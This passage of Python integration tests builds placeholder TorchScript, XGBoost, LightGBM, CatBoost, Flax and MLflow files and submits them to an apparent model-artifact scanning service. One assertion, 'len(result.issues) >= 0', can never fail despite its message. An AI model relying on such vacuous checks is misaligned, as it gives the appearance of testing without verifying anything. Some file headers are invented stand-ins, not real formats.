        with open(os.path.join(ts_model_dir, "constants.pkl"), "wb") as f:
            pickle.dump([], f)  # Empty constants
        
        with open(os.path.join(ts_model_dir, "code", "__torch__.py"), "w") as f:
            f.write("# TorchScript generated code\n")
            f.write("def forward(self, x):\n")
            f.write("    return x\n")
        
        # Create .pt file (ZIP archive)
        ts_path = os.path.join(model_dir, "scripted_model.pt")
        with zipfile.ZipFile(ts_path, "w") as zf:
            for root, dirs, files in os.walk(ts_model_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, ts_model_dir)
                    zf.write(file_path, arcname)
        
        # Clean up temp dir
        shutil.rmtree(ts_model_dir)
        
        # Create archive
        zip_path = os.path.join(temp_dir, "torchscript_model.zip")
        with zipfile.ZipFile(zip_path, "w") as zip_file:
            for root, dirs, files in os.walk(model_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, temp_dir)
                    zip_file.write(file_path, arcname)
        
        async with model_total_client as client:
            result = await client.scan_artifact(
                model_id="torchscript-test",
                model_name="torchscript-format-test",
                model_version="1.0.0",
                model_url=f"{server_url}/torchscript_model.zip",
                org_id="test-torchscript-org"
            )
        
        assert result is not None, "Should process TorchScript format"
        # TorchScript contains pickled data
        assert len(result.issues) >= 0, "Should scan TorchScript files"
    
    @pytest.mark.asyncio
    async def test_other_ml_formats(self, docker_compose_setup, model_total_client, test_file_server):
        """Test other ML formats (XGBoost, LightGBM, CatBoost, etc.)."""
        server_url, temp_dir = test_file_server
        
        model_dir = os.path.join(temp_dir, "other_ml_models")
        os.makedirs(model_dir, exist_ok=True)
        
        # XGBoost model (.model, .json)
        xgb_path = os.path.join(model_dir, "xgboost.model")
        with open(xgb_path, "wb") as f:
            # XGBoost binary format header
            f.write(b"XGBOOST_BINARY_MAGIC")
            f.write(struct.pack("<I", 1))  # Version
            f.write(b"\x00" * 100)
        
        # XGBoost JSON format
        xgb_json = {
            "learner": {
                "gradient_booster": {
                    "name": "gbtree",
                    "gbtree_train_param": {
                        "num_trees": "100"
                    }
                }
            }
        }
        with open(os.path.join(model_dir, "xgboost.json"), "w") as f:
            json.dump(xgb_json, f)
        
        # LightGBM model
        lgb_path = os.path.join(model_dir, "lightgbm.txt")
        with open(lgb_path, "w") as f:
            f.write("tree\n")
            f.write("version=3.3.2\n")
            f.write("num_tree=100\n")
            f.write("num_tree_per_iteration=1\n")
            f.write("[Trees]\n")
            f.write("Tree=0\n")
            f.write("num_leaves=31\n")
            f.write("split_feature=0 1 2\n")
        
        # CatBoost model
        catboost_path = os.path.join(model_dir, "catboost.cbm")
        with open(catboost_path, "wb") as f:
            # CatBoost binary format
            f.write(b"CatBoostModel\x00")
            f.write(struct.pack("<I", 1))  # Format version
            f.write(b"\x00" * 100)
        
        # JAX/Flax model (uses msgpack)
        flax_path = os.path.join(model_dir, "flax_model.msgpack")
        with open(flax_path, "wb") as f:
            # MessagePack format
            f.write(b"\x82")  # fixmap with 2 elements
            f.write(b"\xa6params")  # "params" key
            f.write(b"\x81")  # fixmap with 1 element
            
        # MLflow model
        mlflow_dir = os.path.join(model_dir, "mlflow_model")
        os.makedirs(mlflow_dir, exist_ok=True)
        
        mlflow_meta = {
            "artifact_path": "model",
            "flavors": {
                "python_function": {
                    "loader_module": "mlflow.sklearn",
                    "python_version": "3.8.0"
                }
            },
            "run_id": "abc123",
            "signature": {
                "inputs": "[{\"type\": \"tensor\", \"tensor-spec\": {\"dtype\": \"float32\", \"shape\": [-1, 4]}}]",
                "outputs": "[{\"type\": \"tensor\", \"tensor-spec\": {\"dtype\": \"int32\", \"shape\": [-1]}}]"
            }
        }
        with open(os.path.join(mlflow_dir, "MLmodel"), "w") as f:
            yaml.dump(mlflow_meta, f)
        
        # Create archive
        zip_path = os.path.join(temp_dir, "other_ml_models.zip")
        with zipfile.ZipFile(zip_path, "w") as zip_file:
            for root, dirs, files in os.walk(model_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, temp_dir)
                    zip_file.write(file_path, arcname)
        
        async with model_total_client as client:
            result = await client.scan_artifact(
                model_id="other-ml-formats-test",
                model_name="various-ml-format-test",
                model_version="1.0.0",
                model_url=f"{server_url}/other_ml_models.zip",
                org_id="test-other-ml-org"
            )
        
        # Should handle various ML formats
        assert result is not None, "Should process various ML model formats"